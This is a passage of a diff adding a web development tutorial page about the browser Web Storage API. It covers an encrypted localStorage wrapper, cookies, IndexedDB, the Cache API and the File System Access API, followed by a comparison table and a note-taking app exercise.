+    
+    // Encrypt and store data
+    setItem(key, value) {
+        try {
+            const valueStr = JSON.stringify(value);
+            const encrypted = CryptoJS.AES.encrypt(valueStr, this._encryptionKey).toString();
+            localStorage.setItem(key, encrypted);
+            return true;
+        } catch (e) {
+            console.error('Encryption error:', e);
+            return false;
+        }
+    },
+    
+    // Retrieve and decrypt data
+    getItem(key, defaultValue = null) {
+        try {
+            const encrypted = localStorage.getItem(key);
+            
+            if (!encrypted) {
+                return defaultValue;
+            }
+            
+            const decrypted = CryptoJS.AES.decrypt(encrypted, this._encryptionKey).toString(CryptoJS.enc.Utf8);
+            return JSON.parse(decrypted);
+        } catch (e) {
+            console.error('Decryption error:', e);
+            return defaultValue;
+        }
+    },
+    
+    // Remove item
+    removeItem(key) {
+        localStorage.removeItem(key);
+    }
+};
+
+// Example usage
+SecureStorage.setItem('userData', {
+    email: 'user@example.com',
+    preferences: { notifications: true }
+});
+
+const userData = SecureStorage.getItem('userData');
+console.log(userData.email); // user@example.com</code></pre>
+                        
+                        <div class="info-box">
+                            <h4>Security Best Practices</h4>
+                            <ul>
+                                <li>Use cookies with the HttpOnly flag for authentication tokens</li>
+                                <li>Implement proper Content Security Policy (CSP) headers</li>
+                                <li>Validate and sanitize all data retrieved from storage</li>
+                                <li>Consider using the more secure IndexedDB for larger amounts of data</li>
+                                <li>Be aware that users can modify localStorage data through browser developer tools</li>
+                                <li>Remember that client-side encryption provides limited security since the key must be accessible to the client</li>
+                                <li>For truly sensitive data, keep it server-side and implement proper authentication</li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="card">
+                        <h2>Alternatives to Web Storage</h2>
+                        <p>While Web Storage is useful for many scenarios, there are other client-side storage options that may be more appropriate depending on your needs:</p>
+                        
+                        <h3>Cookies</h3>
+                        <p>Cookies are still useful for certain scenarios, especially when data needs to be sent to the server with every request:</p>
+                        
+                        <pre><code class="language-javascript">// Setting a cookie
+document.cookie = "username=John; expires=Fri, 31 Dec 2023 23:59:59 GMT; path=/; Secure; SameSite=Strict";
+
+// Reading cookies
+function getCookie(name) {
+    const cookies = document.cookie.split(';');
+    for (let i = 0; i < cookies.length; i++) {
+        const cookie = cookies[i].trim();
+        if (cookie.startsWith(name + '=')) {
+            return cookie.substring(name.length + 1);
+        }
+    }
+    return null;
+}
+
+// Deleting a cookie
+document.cookie = "username=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/;";</code></pre>
+                        
+                        <h3>IndexedDB</h3>
+                        <p>IndexedDB is a more powerful, asynchronous, object-oriented database that's suitable for larger amounts of structured data:</p>
+                        
+                        <pre><code class="language-javascript">// Opening a database
+const request = indexedDB.open('MyDatabase', 1);
+
+request.onerror = function(event) {
+    console.error('Database error:', event.target.error);
+};
+
+request.onupgradeneeded = function(event) {
+    const db = event.target.result;
+    
+    // Create an object store (table)
+    const objectStore = db.createObjectStore('customers', { keyPath: 'id' });
+    
+    // Create indexes
+    objectStore.createIndex('name', 'name', { unique: false });
+    objectStore.createIndex('email', 'email', { unique: true });
+};
+
+request.onsuccess = function(event) {
+    const db = event.target.result;
+    
+    // Add data
+    function addCustomer(customer) {
+        const transaction = db.transaction(['customers'], 'readwrite');
+        const objectStore = transaction.objectStore('customers');
+        const request = objectStore.add(customer);
+        
+        request.onsuccess = function() {
+            console.log('Customer added successfully');
+        };
+        
+        transaction.oncomplete = function() {
+            console.log('Transaction completed');
+        };
+        
+        transaction.onerror = function(event) {
+            console.error('Transaction error:', event.target.error);
+        };
+    }
+    
+    // Get data
+    function getCustomer(id) {
+        const transaction = db.transaction(['customers']);
+        const objectStore = transaction.objectStore('customers');
+        const request = objectStore.get(id);
+        
+        request.onsuccess = function() {
+            if (request.result) {
+                console.log('Customer:', request.result);
+            } else {
+                console.log('Customer not found');
+            }
+        };
+    }
+    
+    // Example usage
+    addCustomer({ id: 1, name: 'John Doe', email: 'john@example.com' });
+    getCustomer(1);
+};</code></pre>
+                        
+                        <h3>Cache API</h3>
+                        <p>The Cache API is designed for storing HTTP responses and is commonly used with Service Workers for offline capabilities:</p>
+                        
+                        <pre><code class="language-javascript">// Opening a cache
+caches.open('my-cache-v1').then(cache => {
+    // Add resources to the cache
+    cache.addAll([
+        '/',
+        '/styles.css',
+        '/script.js',
+        '/images/logo.png'
+    ]).then(() => {
+        console.log('Resources cached successfully');
+    });
+    
+    // Add individual response
+    fetch('/api/data').then(response => {
+        cache.put('/api/data', response);
+    });
+});
+
+// Retrieving from cache
+caches.match('/api/data').then(response => {
+    if (response) {
+        return response.json();
+    }
+    // Fetch from network if not in cache
+    return fetch('/api/data').then(response => response.json());
+}).then(data => {
+    console.log('Data:', data);
+});</code></pre>
+                        
+                        <h3>File System Access API</h3>
+                        <p>The newer File System Access API allows web apps to interact with files on the user's local device:</p>
+                        
+                        <pre><code class="language-javascript">// Show file picker and read a file
+async function getFileContent() {
+    try {
+        // Show file picker
+        const [fileHandle] = await window.showOpenFilePicker();
+        
+        // Get file
+        const file = await fileHandle.getFile();
+        
+        // Read file content
+        const content = await file.text();
+        
+        console.log('File content:', content);
+        return content;
+    } catch (err) {
+        console.error('Error accessing file:', err);
+    }
+}
+
+// Save content to a file
+async function saveFile(content) {
+    try {
+        // Show save file picker
+        const fileHandle = await window.showSaveFilePicker({
+            suggestedName: 'myfile.txt',
+            types: [{
+                description: 'Text Files',
+                accept: { 'text/plain': ['.txt'] }
+            }]
+        });
+        
+        // Create writable stream
+        const writable = await fileHandle.createWritable();
+        
+        // Write content
+        await writable.write(content);
+        
+        // Close file
+        await writable.close();
+        
+        console.log('File saved successfully');
+    } catch (err) {
+        console.error('Error saving file:', err);
+    }
+}</code></pre>
+                        
+                        <div class="comparison-table">
+                            <table>
+                                <thead>
+                                    <tr>
+                                        <th>Storage Option</th>
+                                        <th>Best For</th>
+                                        <th>Limitations</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <tr>
+                                        <td>localStorage</td>
+                                        <td>Simple key-value data, user preferences, app state</td>
+                                        <td>5-10MB limit, synchronous, string-only, no expiration</td>
+                                    </tr>
+                                    <tr>
+                                        <td>sessionStorage</td>
+                                        <td>Temporary session data, form data, wizard steps</td>
+                                        <td>Lost when tab closes, same limitations as localStorage</td>
+                                    </tr>
+                                    <tr>
+                                        <td>Cookies</td>
+                                        <td>Server-accessible data, authentication tokens</td>
+                                        <td>4KB limit, sent with every request, complex syntax</td>
+                                    </tr>
+                                    <tr>
+                                        <td>IndexedDB</td>
+                                        <td>Large structured data, offline apps, complex queries</td>
+                                        <td>Complex API, asynchronous, higher learning curve</td>
+                                    </tr>
+                                    <tr>
+                                        <td>Cache API</td>
+                                        <td>HTTP responses, offline resources, service workers</td>
+                                        <td>Designed for request/response pairs, not general data</td>
+                                    </tr>
+                                    <tr>
+                                        <td>File System Access API</td>
+                                        <td>Reading/writing local files, document editors</td>
+                                        <td>Requires user permission, limited browser support</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+                    
+                    <div class="card">
+                        <h2>Practice Exercise: Building a Note-Taking App</h2>
+                        <p>Let's create a simple note-taking application that uses Web Storage to save and retrieve notes.</p>
+                        
+                        <h3>Exercise: Create a Note-Taking App</h3>
+                        <p>Build a note-taking app with the following features:</p>
+                        <ul>
+                            <li>Create, edit, and delete notes</li>
+                            <li>Save notes to localStorage</li>
+                            <li>Organize notes with categories or tags</li>
+                            <li>Search functionality</li>
+                            <li>Responsive design</li>
+                        </ul>
+                        
+                        <p>Start with this template and enhance it:</p>
+                        
+                        <pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+&lt;head&gt;
+    &lt;meta charset="UTF-8"&gt;
+    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
+    &lt;title&gt;Note Taking App&lt;/title&gt;
+    &lt;style&gt;
+        /* Add your styles here */
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 20px;
+            color: #333;
+        }
+        
+        h1, h2 {
+            color: #3366ff;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        /* Add more styles for your app */
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class="container"&gt;
+        &lt;h1&gt;Note Taking App&lt;/h1&gt;
+        
+        &lt;div class="app-container"&gt;
+            &lt;div class="sidebar"&gt;
+                &lt;h2&gt;Notes&lt;/h2&gt;
+                &lt;div id="notes-list"&gt;
+                    &lt;!-- Notes list will be displayed here --&gt;
+                &lt;/div&gt;
+                &lt;button id="new-note-btn"&gt;New Note&lt;/button&gt;
+            &lt;/div&gt;
+            
+            &lt;div class="editor"&gt;
+                &lt;input type="text" id="note-title" placeholder="Note Title"&gt;
+                &lt;textarea id="note-content" placeholder="Note Content"&gt;&lt;/textarea&gt;
+                &lt;div class="editor-controls"&gt;
+                    &lt;button id="save-note-btn"&gt;Save&lt;/button&gt;
+                    &lt;button id="delete-note-btn"&gt;Delete&lt;/button&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+    
+    &lt;script&gt;
+        // Add your JavaScript here
+        document.addEventListener('DOMContentLoaded', function() {
+            // Initialize the app
+            initApp();
+            
+            // Load notes from localStorage
+            loadNotes();
+            
+            // Add event listeners
+            document.getElementById('new-note-btn').addEventListener('click', createNewNote);
+            document.getElementById('save-note-btn').addEventListener('click', saveNote);
+            document.getElementById('delete-note-btn').addEventListener('click', deleteNote);
+        });
+        
+        function initApp() {
+            // Initialize your app
+        }
+        
+        function loadNotes() {
+            // Load notes from localStorage
+        }
+        
+        function createNewNote() {
+            // Create a new note
+        }
+        
+        function saveNote() {
+            // Save the current note
+        }
+        
+        function deleteNote() {
+            // Delete the current note
+        }
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+                        
+                        <div class="try-it-box">
+                            <h4>Challenge Yourself</h4>
+                            <p>Enhance the template with:</p>
+                            <ol>
+                                <li>A proper data structure for notes (title, content, timestamp, tags, etc.)</li>
+                                <li>Complete localStorage implementation with error handling</li>
+                                <li>Categories or tags for organizing notes</li>
+                                <li>Search functionality to find notes by title or content</li>
+                                <li>Sorting options (by date, title, etc.)</li>
+                                <li>Auto-save functionality using the storage event</li>
+                                <li>Export/import functionality for backing up notes</li>
+                                <li>A responsive design that works well on both desktop and mobile devices</li>
+                            </ol>
+                        </div>
+                    </div>
+                    
+                    <div class="card">
+                        <h2>Summary</h2>
+                        <p>In this lesson, we've explored the Web Storage API, which provides a way to store data locally in the browser:</p>
+                        <ul>
+                            <li><strong>localStorage</strong> for persistent storage that survives browser restarts</li>
+                            <li><strong>sessionStorage</strong> for temporary storage that's cleared when the tab is closed</li>
+                            <li><strong>Storage events</strong> for synchronizing data across tabs</li>
+                            <li><strong>Storage wrappers</strong> for easier and safer usage</li>
+                            <li><strong>Security considerations</strong> when storing data on the client side</li>
+                            <li><strong>Alternatives</strong> like IndexedDB, Cache API, and File System Access API</li>
+                        </ul>
+                        
+                        <p>Web Storage provides a simple yet powerful way to enhance web applications with client-side data persistence. By understanding its capabilities and limitations, you can use it effectively to improve user experience, reduce server load, and enable offline functionality.</p>
+                        
+                        <p>Remember these key points:</p>
+                        <ul>
+                            <li><strong>Use localStorage</strong> for persistent data like user preferences</li>
+                            <li><strong>Use sessionStorage</strong> for temporary data like form inputs</li>
+                            <li><strong>Always check for support</strong> and provide fallbacks</li>
+                            <li><strong>Handle errors</strong> like quota exceeded or private browsing mode</li>
+                            <li><strong>Be mindful of security</strong> and don't store sensitive information</li>
+                            <li><strong>Consider alternatives</strong> for more complex storage needs</li>
+                        </ul>
+                        
+                        <p>In the next lesson, we'll explore the Geolocation API, which allows web applications to access the user's geographical location.</p>
+                    </div>
+                    
+                    <!-- Navigation Buttons -->
+                    <div class="page-navigation">
+                        <a href="page17.html" class="btn">Previous: HTML APIs</a>
+                        <a href="page19.html" class="btn">Next: Geolocation API</a>
+                    </div>
+                </section>
+            </div>
+        </div>
+    </main>
+    
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <div class="footer-grid">
+                <div>
+                    <div class="footer-logo">
+                        <img src="../../../assets/images/logo.svg" alt="HTML & CSS Mastery">
+                        <h2>HTML & CSS Mastery</h2>
+                    </div>
+                    <p>A comprehensive guide to modern web development with a futuristic aesthetic approach.</p>
+                </div>
+                <div>
+                    <h3>Quick Links</h3>
+                    <ul>
+                        <li><a href="../../../index.html">Home</a></li>
+                        <li><a href="../basic/page1.html">HTML Basics</a></li>
+                        <li><a href="../professional/page13.html">Professional HTML</a></li>
+                        <li><a href="../../css/basic/page26.html">CSS Basics</a></li>
+                        <li><a href="../../css/professional/page38.html">Professional CSS</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h3>Resources</h3>
+                    <ul>
+                        <li><a href="#">HTML Reference</a></li>
+                        <li><a href="#">CSS Reference</a></li>
+                        <li><a href="#">Web Design Principles</a></li>
+                        <li><a href="#">Accessibility Guidelines</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="copyright">
+                <p>&copy; 2025 HTML & CSS Mastery Course. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+    
+    <!-- Scripts -->
+    <script src="../../../assets/js/main.js"></script>
+</body>
+</html>
